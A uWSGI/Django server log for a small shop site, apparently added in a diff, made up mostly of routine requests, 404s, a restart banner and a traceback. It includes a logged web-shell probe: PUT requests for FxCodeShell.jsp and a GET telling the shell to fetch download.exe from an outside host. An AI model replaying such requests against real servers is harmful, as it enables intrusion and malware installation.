+[pid: 31375|app: 0|req: 54/54] 113.88.14.120 () {44 vars in 1226 bytes} [Mon Mar 18 00:46:04 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 31375|app: 0|req: 55/55] 113.88.14.120 () {44 vars in 1261 bytes} [Mon Mar 18 00:46:05 2019] GET / => generated 66063 bytes in 18 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 31375|app: 0|req: 56/56] 113.88.14.120 () {42 vars in 1229 bytes} [Mon Mar 18 00:46:05 2019] GET /images/index/fold.jpg => generated 5161 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 31375|app: 0|req: 57/57] 113.87.160.176 () {42 vars in 1234 bytes} [Mon Mar 18 00:46:05 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 31375|app: 0|req: 58/58] 113.88.14.120 () {44 vars in 1224 bytes} [Mon Mar 18 00:46:05 2019] GET /json/toutiao.json => generated 5149 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 31375|app: 0|req: 59/59] 113.87.160.176 () {44 vars in 1225 bytes} [Mon Mar 18 00:46:05 2019] GET /json/playimg.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 31375|app: 0|req: 60/60] 113.88.14.120 () {44 vars in 1226 bytes} [Mon Mar 18 00:46:05 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 31375|app: 0|req: 61/61] 113.88.14.120 () {44 vars in 1261 bytes} [Mon Mar 18 00:46:05 2019] GET / => generated 66063 bytes in 17 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 31375|app: 0|req: 62/62] 113.88.14.120 () {42 vars in 1229 bytes} [Mon Mar 18 00:46:05 2019] GET /images/index/fold.jpg => generated 5161 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 31375|app: 0|req: 63/63] 113.87.160.176 () {42 vars in 1234 bytes} [Mon Mar 18 00:46:05 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 31375|app: 0|req: 64/64] 113.88.14.120 () {44 vars in 1224 bytes} [Mon Mar 18 00:46:05 2019] GET /json/toutiao.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 31375|app: 0|req: 65/65] 113.87.160.176 () {44 vars in 1225 bytes} [Mon Mar 18 00:46:05 2019] GET /json/playimg.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 31375|app: 0|req: 66/66] 113.88.14.120 () {44 vars in 1226 bytes} [Mon Mar 18 00:46:05 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 31375|app: 0|req: 67/67] 113.87.160.176 () {44 vars in 1262 bytes} [Mon Mar 18 00:48:59 2019] GET / => generated 66063 bytes in 17 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 31375|app: 0|req: 68/68] 113.87.160.176 () {42 vars in 1234 bytes} [Mon Mar 18 00:48:59 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 31375|app: 0|req: 69/69] 113.88.14.120 () {42 vars in 1229 bytes} [Mon Mar 18 00:48:59 2019] GET /images/index/fold.jpg => generated 5161 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 31375|app: 0|req: 70/70] 113.88.14.120 () {44 vars in 1224 bytes} [Mon Mar 18 00:48:59 2019] GET /json/playimg.json => generated 5149 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 31375|app: 0|req: 71/71] 113.87.160.176 () {44 vars in 1225 bytes} [Mon Mar 18 00:48:59 2019] GET /json/toutiao.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 31375|app: 0|req: 72/72] 113.87.160.176 () {44 vars in 1227 bytes} [Mon Mar 18 00:48:59 2019] GET /json/newgoods.json => generated 5152 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 31375|app: 0|req: 73/73] 113.87.160.176 () {44 vars in 1262 bytes} [Mon Mar 18 00:49:00 2019] GET / => generated 66063 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 31375|app: 0|req: 74/74] 113.88.14.120 () {42 vars in 1233 bytes} [Mon Mar 18 00:49:00 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 31375|app: 0|req: 75/75] 113.87.160.176 () {42 vars in 1230 bytes} [Mon Mar 18 00:49:00 2019] GET /images/index/fold.jpg => generated 5161 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 31375|app: 0|req: 76/76] 113.88.14.120 () {44 vars in 1224 bytes} [Mon Mar 18 00:49:00 2019] GET /json/playimg.json => generated 5149 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 31375|app: 0|req: 77/77] 113.87.160.176 () {44 vars in 1225 bytes} [Mon Mar 18 00:49:00 2019] GET /json/toutiao.json => generated 5149 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 31375|app: 0|req: 78/78] 113.87.160.176 () {44 vars in 1227 bytes} [Mon Mar 18 00:49:00 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+*** Starting uWSGI 2.0.18 (64bit) on [Mon Mar 18 08:50:32 2019] ***
+compiled with version: 5.4.0 20160609 on 13 March 2019 09:02:17
+os: Linux-4.4.0-93-generic #116-Ubuntu SMP Fri Aug 11 21:17:51 UTC 2017
+nodename: iZjlynlmysim61Z
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/zwyz
+writing pidfile to uwsgi.pid
+detected binary path: /root/.virtualenvs/ZWYZ/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/zwyz/
+*** WARNING: you are running uWSGI without its master process manager ***
+your processes number limit is 7857
+your memory page size is 4096 bytes
+detected max file descriptor number: 65535
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 0.0.0.0:8020 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.5.2 (default, Nov 12 2018, 13:43:14)  [GCC 5.4.0 20160609]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x1713fa0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 72904 bytes (71 KB) for 1 cores
+*** Operational MODE: single process ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x1713fa0 pid: 31526 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI worker 1 (and the only) (pid: 31526, cores: 1)
+[pid: 31526|app: 0|req: 1/1] 113.87.160.176 () {44 vars in 1255 bytes} [Mon Mar 18 00:50:38 2019] GET / => generated 66062 bytes in 231 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 31526|app: 0|req: 2/2] 113.87.160.176 () {42 vars in 1230 bytes} [Mon Mar 18 00:50:39 2019] GET /images/index/fold.jpg => generated 5161 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 31526|app: 0|req: 3/3] 113.87.160.176 () {42 vars in 1234 bytes} [Mon Mar 18 00:50:39 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 31526|app: 0|req: 4/4] 113.87.160.176 () {44 vars in 1225 bytes} [Mon Mar 18 00:50:39 2019] GET /json/toutiao.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 31526|app: 0|req: 5/5] 113.87.160.176 () {44 vars in 1225 bytes} [Mon Mar 18 00:50:39 2019] GET /json/playimg.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 31526|app: 0|req: 6/6] 113.87.160.176 () {44 vars in 1227 bytes} [Mon Mar 18 00:50:39 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 7/7] 113.87.160.176 () {44 vars in 1279 bytes} [Mon Mar 18 00:51:12 2019] GET /list/ => generated 128243 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 126 bytes (1 switches on core 0)
+Not Found: /list/json/kouhong.json
+[pid: 31526|app: 0|req: 8/8] 113.87.160.176 () {44 vars in 1240 bytes} [Mon Mar 18 00:51:12 2019] GET /list/json/kouhong.json => generated 5164 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 9/9] 113.87.160.176 () {44 vars in 1284 bytes} [Mon Mar 18 00:51:14 2019] GET /cart/ => generated 29780 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 10/10] 113.88.14.120 () {44 vars in 1268 bytes} [Mon Mar 18 00:54:12 2019] GET / => generated 66062 bytes in 18 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 31526|app: 0|req: 11/11] 113.88.14.120 () {42 vars in 1233 bytes} [Mon Mar 18 00:54:12 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 31526|app: 0|req: 12/12] 113.87.160.176 () {42 vars in 1230 bytes} [Mon Mar 18 00:54:12 2019] GET /images/index/fold.jpg => generated 5161 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 31526|app: 0|req: 13/13] 113.88.14.120 () {44 vars in 1224 bytes} [Mon Mar 18 00:54:12 2019] GET /json/toutiao.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 31526|app: 0|req: 14/14] 113.87.160.176 () {44 vars in 1225 bytes} [Mon Mar 18 00:54:12 2019] GET /json/playimg.json => generated 5149 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 31526|app: 0|req: 15/15] 113.88.14.120 () {44 vars in 1226 bytes} [Mon Mar 18 00:54:12 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /goodcar.html
+[pid: 31526|app: 0|req: 16/16] 113.88.14.120 () {44 vars in 1292 bytes} [Mon Mar 18 00:54:36 2019] GET /goodcar.html => generated 5134 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 17/17] 45.71.14.2 () {32 vars in 442 bytes} [Mon Mar 18 01:02:39 2019] GET / => generated 66083 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 18/18] 2.179.215.174 () {32 vars in 446 bytes} [Mon Mar 18 01:33:08 2019] GET / => generated 66083 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 19/19] 101.132.107.246 () {34 vars in 482 bytes} [Mon Mar 18 01:51:33 2019] GET / => generated 66083 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 20/20] 101.132.107.246 () {34 vars in 482 bytes} [Mon Mar 18 01:51:33 2019] GET / => generated 66083 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+[pid: 31526|app: 0|req: 21/21] 47.97.16.76 () {26 vars in 260 bytes} [Mon Mar 18 01:55:54 2019] GET / => generated 55087 bytes in 32 msecs (HTTP/1.0 400) 1 headers in 53 bytes (1 switches on core 0)
+invalid request block size: 21589 (max 4096)...skip
+invalid request block size: 21589 (max 4096)...skip
+invalid request block size: 21589 (max 4096)...skip
+invalid request block size: 21573 (max 4096)...skip
+[pid: 31526|app: 0|req: 22/22] 185.233.246.19 () {32 vars in 453 bytes} [Mon Mar 18 02:08:58 2019] GET / => generated 66083 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Internal Server Error: /generateorder/
+Traceback (most recent call last):
+  File "/root/.virtualenvs/ZWYZ/lib/python3.5/site-packages/django/core/handlers/exception.py", line 41, in inner
+    response = get_response(request)
+  File "/root/.virtualenvs/ZWYZ/lib/python3.5/site-packages/django/core/handlers/base.py", line 187, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "/root/.virtualenvs/ZWYZ/lib/python3.5/site-packages/django/core/handlers/base.py", line 185, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "./app/views.py", line 229, in generateorder
+    user = User.objects.get(pk=userid)
+  File "/root/.virtualenvs/ZWYZ/lib/python3.5/site-packages/django/db/models/manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "/root/.virtualenvs/ZWYZ/lib/python3.5/site-packages/django/db/models/query.py", line 380, in get
+    self.model._meta.object_name
+app.models.DoesNotExist: User matching query does not exist.
+[pid: 31526|app: 0|req: 23/23] 101.132.131.7 () {34 vars in 508 bytes} [Mon Mar 18 02:14:47 2019] GET /generateorder/ => generated 66518 bytes in 46 msecs (HTTP/1.1 500) 4 headers in 129 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 24/24] 101.132.102.45 () {34 vars in 499 bytes} [Mon Mar 18 02:30:40 2019] GET /register/ => generated 10968 bytes in 4 msecs (HTTP/1.1 200) 5 headers in 279 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 25/25] 47.100.51.203 () {34 vars in 1819 bytes} [Mon Mar 18 02:39:07 2019] GET /returnurl/?charset=utf-8&out_trade_no=1552826834.90470849787&method=alipay.trade.page.pay.return&total_amount=42.00&sign=ho1bq4%2fnxp3cmfd3qg5s2cbiryavxjqblrlimxqnztzq9makjd%2felc%2fx6xytsb1xfhlk%2fh2lvarvovnufkpkwpsp%2baqi4zsrnwno7hnvr5jftnlz45lma4rgl9pzxqjgyuajgkindekenz2wevfdpenq5hcsehqktwlhdmtvqotmx4ecmf6yhweaerfgr3a3nzqr4ftjsrjanmveyon2gy%2but%2baiuhdoikygplmokax3xtxnz%2fn6kpwawwfocsizad%2beqfgokpo5hsshn2zckfm5fgeo9ceqqknxajw7sueivjjkrfduncpyyr%2fnizx6gxkwsdawvkcr%2fwzwkdplka%3d%3d&trade_no=2019031722001438721000002024&auth_app_id=2016092800612147&version=1.0&app_id=2016092800612147&sign_type=rsa2&seller_id=2088102177580591&timestamp=2019-03-17+20%3a48%3a09 => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 123 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 26/26] 47.100.51.203 () {34 vars in 480 bytes} [Mon Mar 18 02:39:07 2019] GET / => generated 66083 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp 
+[pid: 31526|app: 0|req: 27/27] 39.108.74.104 () {42 vars in 629 bytes} [Mon Mar 18 03:04:48 2019] PUT /FxCodeShell.jsp%20 => generated 5148 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp::$DATA
+[pid: 31526|app: 0|req: 28/28] 39.108.74.104 () {42 vars in 643 bytes} [Mon Mar 18 03:04:48 2019] PUT /FxCodeShell.jsp::$DATA => generated 5164 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp/
+[pid: 31526|app: 0|req: 29/29] 39.108.74.104 () {42 vars in 625 bytes} [Mon Mar 18 03:04:48 2019] PUT /FxCodeShell.jsp/ => generated 5146 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /FxCodeShell.jsp
+[pid: 31526|app: 0|req: 30/30] 39.108.74.104 () {38 vars in 735 bytes} [Mon Mar 18 03:04:48 2019] GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe => generated 5223 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 31/31] 47.101.204.188 () {34 vars in 462 bytes} [Mon Mar 18 03:05:35 2019] GET / => generated 66083 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 32/32] 47.92.98.215 () {34 vars in 503 bytes} [Mon Mar 18 03:07:11 2019] GET /xiangqing/1/ => generated 42685 bytes in 10 msecs (HTTP/1.1 200) 3 headers in 111 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 33/33] 47.92.71.118 () {34 vars in 499 bytes} [Mon Mar 18 03:16:52 2019] GET /returnurl/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 4 headers in 123 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 34/34] 47.92.71.118 () {34 vars in 479 bytes} [Mon Mar 18 03:16:52 2019] GET / => generated 66083 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 35/35] 47.101.204.153 () {34 vars in 462 bytes} [Mon Mar 18 03:26:12 2019] GET / => generated 66083 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 36/36] 47.92.151.67 () {34 vars in 493 bytes} [Mon Mar 18 03:33:21 2019] GET /list/3/ => generated 128264 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 126 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 37/37] 47.92.105.73 () {34 vars in 491 bytes} [Mon Mar 18 03:34:40 2019] GET /login/ => generated 11123 bytes in 3 msecs (HTTP/1.1 200) 5 headers in 279 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 38/38] 95.5.168.36 () {32 vars in 443 bytes} [Mon Mar 18 03:37:02 2019] GET / => generated 66083 bytes in 14 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 39/39] 106.14.204.78 () {34 vars in 494 bytes} [Mon Mar 18 03:40:49 2019] GET /list/2/ => generated 128264 bytes in 11 msecs (HTTP/1.1 200) 4 headers in 126 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 40/40] 59.36.132.222 () {34 vars in 461 bytes} [Mon Mar 18 03:40:56 2019] GET / => generated 66083 bytes in 13 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 41/41] 113.88.14.120 () {44 vars in 1254 bytes} [Mon Mar 18 03:49:44 2019] GET / => generated 66062 bytes in 17 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 31526|app: 0|req: 42/42] 113.88.14.120 () {42 vars in 1233 bytes} [Mon Mar 18 03:49:45 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 31526|app: 0|req: 43/43] 113.88.13.180 () {42 vars in 1229 bytes} [Mon Mar 18 03:49:45 2019] GET /images/index/fold.jpg => generated 5161 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 31526|app: 0|req: 44/44] 113.88.14.120 () {44 vars in 1224 bytes} [Mon Mar 18 03:49:45 2019] GET /json/playimg.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 31526|app: 0|req: 45/45] 113.88.13.180 () {44 vars in 1224 bytes} [Mon Mar 18 03:49:45 2019] GET /json/toutiao.json => generated 5149 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 31526|app: 0|req: 46/46] 113.88.13.180 () {44 vars in 1226 bytes} [Mon Mar 18 03:49:45 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 31526|app: 0|req: 47/47] 113.88.13.180 () {42 vars in 1209 bytes} [Mon Mar 18 03:49:45 2019] GET /favicon.ico => generated 5131 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 48/48] 113.88.14.120 () {44 vars in 1261 bytes} [Mon Mar 18 03:57:22 2019] GET / => generated 66062 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 31526|app: 0|req: 49/49] 113.88.13.180 () {42 vars in 1233 bytes} [Mon Mar 18 03:57:22 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 31526|app: 0|req: 50/50] 113.88.14.120 () {42 vars in 1229 bytes} [Mon Mar 18 03:57:22 2019] GET /images/index/fold.jpg => generated 5161 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 31526|app: 0|req: 51/51] 113.88.14.120 () {44 vars in 1224 bytes} [Mon Mar 18 03:57:22 2019] GET /json/playimg.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 31526|app: 0|req: 52/52] 113.88.13.180 () {44 vars in 1224 bytes} [Mon Mar 18 03:57:22 2019] GET /json/toutiao.json => generated 5149 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 31526|app: 0|req: 53/53] 113.88.14.120 () {44 vars in 1226 bytes} [Mon Mar 18 03:57:22 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 54/54] 113.88.14.120 () {44 vars in 1261 bytes} [Mon Mar 18 03:57:23 2019] GET / => generated 66062 bytes in 16 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
+Not Found: /images/index/fold.jpg
+[pid: 31526|app: 0|req: 55/55] 113.88.13.180 () {42 vars in 1229 bytes} [Mon Mar 18 03:57:23 2019] GET /images/index/fold.jpg => generated 5161 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /images/index/unfold.jpg
+[pid: 31526|app: 0|req: 56/56] 113.88.14.120 () {42 vars in 1233 bytes} [Mon Mar 18 03:57:23 2019] GET /images/index/unfold.jpg => generated 5167 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/toutiao.json
+[pid: 31526|app: 0|req: 57/57] 113.88.13.180 () {44 vars in 1224 bytes} [Mon Mar 18 03:57:23 2019] GET /json/toutiao.json => generated 5149 bytes in 5 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/playimg.json
+[pid: 31526|app: 0|req: 58/58] 113.88.14.120 () {44 vars in 1224 bytes} [Mon Mar 18 03:57:23 2019] GET /json/playimg.json => generated 5149 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+Not Found: /json/newgoods.json
+[pid: 31526|app: 0|req: 59/59] 113.88.14.120 () {44 vars in 1226 bytes} [Mon Mar 18 03:57:23 2019] GET /json/newgoods.json => generated 5152 bytes in 4 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
+[pid: 31526|app: 0|req: 60/60] 113.88.14.120 () {44 vars in 1278 bytes} [Mon Mar 18 03:57:24 2019] GET /list/ => generated 133550 bytes in 15 msecs (HTTP/1.1 200) 4 headers in 126 bytes (1 switches on core 0)
+Not Found: /list/json/kouhong.json
+[pid: 31526|app: 0|req: 61/61] 113.88.14.120 () {44 vars in 1239 bytes} [Mon Mar 18 03:57:25 2019] GET /list/json/kouhong.json => generated 5164 bytes in 6 msecs (HTTP/1.1 404) 3 headers in 102 bytes (1 switches on core 0)
